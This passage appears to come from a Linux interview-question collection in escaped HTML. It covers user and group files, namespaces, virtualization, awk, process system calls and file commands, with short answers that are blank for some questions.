&lt;code&gt;/etc/group&lt;/code&gt; file, because every user belong to the primary group that has same name as the username.&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;echo &#34;john&lt;span&gt;❌&lt;/span&gt;2001:&#34; &amp;gt;&amp;gt; /etc/group&lt;/code&gt;&lt;/p&gt; &#xA; &lt;p&gt;Step 3: Verify if the user got created&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;id john&lt;/code&gt;&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What information is stored in /etc/passwd? explain each field&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;&lt;code&gt;/etc/passwd&lt;/code&gt; is a configuration file, which contains users information. Each entry in this file has, 7 fields,&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;username:password:UID:GID:Comment:home directory:shell&lt;/code&gt;&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;username&lt;/code&gt; - The name of the user.&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;password&lt;/code&gt; - This field is actually a placeholder of the password field. Due to security concerns, this field does not contain the password, just a placeholder (x) to the encrypted password stored in &lt;code&gt;/etc/shadow&lt;/code&gt; file.&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;UID&lt;/code&gt; - User ID of the user.&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;GID&lt;/code&gt; - Group ID&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;Comment&lt;/code&gt; - This field is to provide description about the user.&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;home directory&lt;/code&gt; - Abousulte path of the user&#39;s home directory. This directory gets created once the user is added.&lt;/p&gt; &#xA; &lt;p&gt;&lt;code&gt;shell&lt;/code&gt; - This field contains the absolute path of the shell that will be used by the respective user.&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to add a new user to the system without providing him the ability to log-in into the system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;adduser user_name --shell=/bin/false --no-create-home&lt;/code&gt; You can also add a user and then edit /etc/passwd. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to switch to another user? How to switch to the root user?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;su command. Use su - to switch to root &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the UID the root user? What about a regular user?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;UID of root user is 0&lt;/p&gt; &#xA; &lt;p&gt;Default values of UID_MIN and UID_MAX in &lt;code&gt;/etc/login.defs&lt;/code&gt; &lt;code&gt;UID_MIN&lt;/code&gt; is &lt;code&gt;1000&lt;/code&gt; &lt;code&gt;UID_MAX&lt;/code&gt; is &lt;code&gt;60000&lt;/code&gt;&lt;/p&gt; &#xA; &lt;p&gt;Actually, we can change this value. But UID &amp;lt; 1000 are reserved for system accounts. Therefore, as per the default configuration, for regular user UID starts from &lt;code&gt;1000&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What can you do if you lost/forogt the root password?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Re-install the OS IS NOT the right answer :) &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is /etc/skel?&lt;/summary&gt;&#xA; &lt;br&gt; &#xA; &lt;p&gt;&lt;code&gt;/etc/skel&lt;/code&gt; is a directory, that contains files or directories, so when a new user is created, these files/directories created under &lt;code&gt;/etc/skel&lt;/code&gt; will be copied to user&#39;s home directory.&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to see a list of who logged-in to the system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Using the &lt;code&gt;last&lt;/code&gt; command. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain what each of the following commands does: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;useradd&lt;/li&gt; &#xA;   &lt;li&gt;usermod&lt;/li&gt; &#xA;   &lt;li&gt;whoami&lt;/li&gt; &#xA;   &lt;li&gt;id&lt;/li&gt;&#xA;  &lt;/ul&gt;&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt;  &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;useradd&lt;/code&gt; - Command for creating new users &lt;code&gt;usermod&lt;/code&gt; - Modify the users setting &lt;code&gt;whoami&lt;/code&gt; - Outputs, the username that we are currently logged in &lt;code&gt;id&lt;/code&gt; - Prints the&lt;br&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You run &lt;code&gt;grep $(whoami) /etc/passwd&lt;/code&gt; but the output is empty. What might be a possible reason for that?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The user you are using isn&#39;t defined locally but originates from services like LDAP.&lt;br&gt; You can verify with: &lt;code&gt;getent passwd&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux Hardware&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Where can you find information on the processor (like number of CPUs)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;/proc/cpuinfo&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;You can also use &lt;code&gt;nproc&lt;/code&gt; for number of processors &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you print information on the BIOS, motherboard, processor and RAM?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;dmidecoode &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How can you print all the information on connected block devices in your system?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;lsblk &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? In user space, applications don&#39;t have full access to hardware resources&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True. Only in kernel space they have full access to hardware resources. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - Security&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you create a private key for a CA (certificate authority)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;One way is using openssl this way:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;openssl genrsa -aes256 -out ca-private-key.pem 4096&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How do you create a public key for a CA (certificate authority)?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;code&gt;openssl req -new -x509 -days 730 -key [private key file name] -sha256 -out ca.pem&lt;/code&gt;&lt;/p&gt; &lt;p&gt;If using the private key from the previous question then the command would be:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;openssl req -new -x509 -days 730 -key ca-private-key.pem -sha256 -out ca.pem&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - Namespaces&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What types of namespaces are there in Linux?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;Process ID namespaces: these namespaces include independent set of process IDs&lt;/li&gt; &lt;li&gt;Mount namespaces: Isolation and control of mountpoints&lt;/li&gt; &lt;li&gt;Network namespaces: Isolates system networking resources such as routing table, interfaces, ARP table, etc.&lt;/li&gt; &lt;li&gt;UTS namespaces: Isolate host and domains&lt;/li&gt; &lt;li&gt;IPC namespaces: Isolates interprocess communications&lt;/li&gt; &lt;li&gt;User namespaces: Isolate user and group IDs&lt;/li&gt; &lt;li&gt;Time namespaces: Isolates time machine &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? In every PID (Process ID) namespace the first process assigned with the process id number 1&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True. Inside the namespace it&#39;s PID 1 while to the parent namespace the PID is a different one. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? In a child PID namespace all processes are aware of parent PID namespace and processes and the parent PID namespace has no visibility of child PID namespace processes&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. The opposite is true. Parent PID namespace is aware and has visibility of processes in child PID namespace and child PID namespace has no visibility as to what is going on in the parent PID namespace. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? By default, when creating two separate network namespaces, a ping from one namespace to another will work fine&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. Network namespace has its own interfaces and routing table. There is no way (without creating a bridge for example) for one network namespace to reach another. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? With UTS namespaces, processes may appear as if they run on different hosts and domains while running on the same host&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? It&#39;s not possible to have a root user with ID 0 in child user namespaces&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;False. In every child user namespace, it&#39;s possible to have a separate root user with uid of 0. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What time namespaces are used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;In time namespaces processes can use different system time. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - Virtualization&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What virtualization solutions are available for Linux?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;&lt;a href=&#34;https://www.linux-kvm.org/page/Main_Page&#34;&gt;KVM&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;http://www.xen.org/&#34;&gt;XEN&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;https://www.virtualbox.org/&#34;&gt;VirtualBox&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;http://linux-vserver.org/Welcome_to_Linux-VServer.org&#34;&gt;Linux-VServer&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&#34;http://user-mode-linux.sourceforge.net/&#34;&gt;User-mode Linux&lt;/a&gt;&lt;/li&gt; &lt;li&gt;... &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is KVM?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;Is an open source virtualization technology used to operate on x86 hardware.&lt;/p&gt; &lt;p&gt;From the official &lt;a href=&#34;https://www.linux-kvm.org/page/Main_Page&#34;&gt;docs&lt;/a&gt; Recommended read:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;&lt;a href=&#34;https://www.redhat.com/en/topics/virtualization/what-is-KVM&#34;&gt;Red Hat Article - What is KVM?&lt;/a&gt; &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is Libvirt?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;It&#39;s an open source collection of software used to manage virtual machines. It can be used with: KVM, Xen, LXC and others. It&#39;s also called Libvirt Virtualization API.&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;From the official &lt;a href=&#34;https://libvirt.org/&#34;&gt;docs&lt;/a&gt; Hypervisor supported &lt;a href=&#34;https://libvirt.org/drivers.html&#34;&gt;docs&lt;/a&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - AWK&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What the &lt;code&gt;awk&lt;/code&gt; command does? Have you used it? What for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;From Wikipedia: &#34;AWK is domain-specific language designed for text processing and typically used as a data extraction and reporting tool&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to print the 4th column in a file?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;awk &#39;{print $4}&#39; file&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to print every line that is longer than 79 characters?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&lt;code&gt;awk &#39;length($0) &amp;gt; 79&#39; file&lt;/code&gt; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What the &lt;code&gt;lsof&lt;/code&gt; command does? Have you used it? What for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between find and locate?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How a user process performs a privileged operation, such as reading from the disk?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Using system calls &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux - System Calls&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is a system call? What system calls are you familiar with?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How a program executes a system call?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;A program executes a trap instruction. The instruction jump into the kernel while raising the privileged level to kernel space.&lt;/li&gt; &lt;li&gt;Once in kernel space, it can perform any privileged operation&lt;/li&gt; &lt;li&gt;Once it&#39;s finished, it calls a &#34;return-from-trap&#34; instruction which returns to user space while reducing back the privilege level to user space. &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the fork() system call&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;fork() is used for creating a new process. It does so by cloning the calling process but the child process has its own PID and any memory locks, I/O operations and semaphores are not inherited. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the return value of fork()?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;On success, the PID of the child process in parent and 0 in child process&lt;/li&gt; &lt;li&gt;On error, -1 in the parent &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Name one reason for fork() to fail&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Not enough memory to create a new process &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why do we need the wait() system call?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;wait() is used by a parent process to wait for the child process to finish execution. If wait is not used by a parent process then a child process might become a zombie process. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How the kernel notifies the parent process about child process termination?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The kernel notifies the parent by sending the SIGCHLD to the parent. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How the waitpid() is different from wait()?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The waitpid() is a non-blocking version of the wait() function.&lt;br&gt; It also supports using library routine (e.g. system()) to wait a child process without messing up with other children processes for which the process has not waited. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? The wait() system call won&#39;t return until the child process has run and exited&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True in most cases though there are cases where wait() returns before the child exits. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the exec() system call&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;It transforms the current running program into another program.&lt;br&gt; Given the name of an executable and some arguments, it loads the code and static data from the specified executable and overwrites its current code segment and current static code data. After initializing its memory space (like stack and heap) the OS runs the program passing any arguments as the argv of that process. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;True or False? A successful call to exec() never returns&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;True&lt;br&gt; Since a succesful exec replace the current process, it can&#39;t return anything to the process that made the call. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What system call is used for listing files?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What system calls are used for creating a new process?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;fork(), exec() and the wait() system call is also included in this workflow. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What execve() does?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;Executes a program. The program is passed as a filename (or path) and must be a binary executable or a script. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the return value of malloc?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Explain the pipe() system call. What does it used for?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;&lt;a href=&#34;https://toroid.org/unix-pipe-implementation&#34;&gt;Unix pipe implementation&lt;/a&gt;&lt;/p&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;&#34;Pipes provide a unidirectional interprocess communication channel. A pipe has a read end and a write end. Data written to the write end of a pipe can be read from the read end of the pipe. A pipe is created using pipe(2), which returns two file descriptors, one referring to the read end of the pipe, the other referring to the write end.&#34; &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What happens when you execute &lt;code&gt;ls -l&lt;/code&gt;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt; &lt;p&gt;Shell reads the input using getline() which reads the input file stream and stores into a buffer as a string&lt;/p&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;The buffer is broken down into tokens and stored in an array this way: {&#34;ls&#34;, &#34;-l&#34;, &#34;NULL&#34;}&lt;/p&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;Shell checks if an expansion is required (in case of ls *.c)&lt;/p&gt; &lt;/li&gt; &#xA;   &lt;li&gt; &lt;p&gt;Once the program in memory, its execution starts. First by calling readdir()&lt;/p&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;p&gt;Notes:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;getline() originates in GNU C library and used to read lines from input stream and stores those lines in the buffer &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What happens when you execute &lt;code&gt;ls -l *.log&lt;/code&gt;?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What readdir() system call does?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What exactly the command &lt;code&gt;alias x=y&lt;/code&gt; does?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Why running a new program is done using the fork() and exec() system calls? why a different API wasn&#39;t developed where there is one call to run a new program?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;This way provides a lot of flexibility. It allows the shell for example, to run code after the call to fork() but before the call to exec(). Such code can be used to alter the environment of the program it about to run. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe shortly what happens when you execute a command in the shell&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;The shell figures out, using the PATH variable, where the executable of the command resides in the filesystem. It then calls fork() to create a new child process for running the command. Once the fork was executed successfully, it calls a variant of exec() to execute the command and finally, waits the command to finish using wait(). When the child completes, the shell returns from wait() and prints out the prompt again. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Linux Filesystem &amp;amp; Files&lt;/h4&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;How to create a file of a certain size?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;p&gt;There are a couple of ways to do that:&lt;/p&gt; &lt;/b&gt;&#xA; &lt;ul&gt;&#xA;  &lt;b&gt; &lt;li&gt;dd if=/dev/urandom of=new_file.txt bs=2MB count=1&lt;/li&gt; &lt;li&gt;truncate -s 2M new_file.txt&lt;/li&gt; &lt;li&gt;fallocate -l 2097152 new_file.txt &lt;/li&gt;&lt;/b&gt;&#xA; &lt;/ul&gt;&#xA;&lt;/details&gt;  &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What does the following block do?: &lt;pre&gt;&lt;code&gt;open(&#34;/my/file&#34;) = 5&#xA;read(5, &#34;file content&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;These system calls are reading the file &lt;code&gt;/my/file&lt;/code&gt; and 5 is the file descriptor number. &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Describe three different ways to remove a file (or its content)&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is the difference between a process and a thread?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;What is context switch?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA; &lt;p&gt;&lt;b&gt;From &lt;a href=&#34;https://en.wikipedia.org/wiki/Context_switch&#34;&gt;wikipedia&lt;/a&gt;: a context switch is the process of storing the state of a process or thread, so that it can be restored and resume execution at a later point &lt;/b&gt;&lt;/p&gt;&#xA;&lt;/details&gt;&#xA;&lt;p&gt;&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;You found there is a server with high CPU load but you didn&#39;t find a process with high CPU. How is that possible?&lt;/summary&gt;&#xA; &lt;br&gt;&#xA; &lt;b&gt; &lt;/b&gt;&#xA;&lt;/details&gt; &#xA;&lt;h5&gt;Linux Advanced - 